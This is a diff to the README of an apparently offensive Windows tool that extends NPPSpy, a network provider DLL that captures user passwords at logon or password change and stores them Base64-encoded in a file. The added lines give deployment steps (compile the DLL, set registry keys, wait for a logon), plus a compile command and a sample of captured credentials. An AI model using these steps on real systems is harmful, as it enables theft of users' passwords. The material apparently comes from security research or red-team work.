@@ -9,6 +9,15 @@ I will use Base64-encoding or AES-encryption in all examples with the following 
 ```
 
 
+To use it, simply:
+
+- Compile the DLL (the easiest way is using "x64 Native Tools Command Prompt for VS" cmd)
+
+- Create or update the registry keys (check the [installation](#installation) section)
+
+- Wait until a user logs in or updates its password
+
+
 <br>
 
 ## 1. Store in a text file + Base64-encoding
@@ -19,7 +28,7 @@ The default path is "C:\Windows\Task\default.txt" but you can customize it using
 cl /LD /DFILE_PATH=\"C:\\\\Windows\\\\Tasks\\\\custom_path.txt\" 1_textfile_base64.c crypt32.lib /link /OUT:anp.dll
 ```
 
-This creates a file with a content similar to:
+When a user updates its password, it creates a file with a content similar to:
 
 ```bash
 eyJ0aW1lc3RhbXAiOiIyMDI1LTA0LTE0IDEwOjI4OjM2Iiwib3BlcmF0aW9uIjoiUFdEX1VQREFURV9PTEQiLCJkb21haW4iOiJERVNLVE9QLTBONkc2OTYiLCJ1c2VybmFtZSI6InJpY2FyZG8iLCJwYXNzd29yZCI6InFxIn0=
@@ -170,4 +179,4 @@ You can follow the instructions in [NPPSpy](https://github.com/gtworek/PSBits/tr
 
 ## References
 
-- [NPPSpy2](https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy2) by [gtworek](https://github.com/gtworek) - Again, these programs are just adding some functionality to NPPSpy(2) code..
+- [NPPSpy2](https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy2) by [gtworek](https://github.com/gtworek) - Again, these programs are just adding some functionality to NPPSpy(2) code.
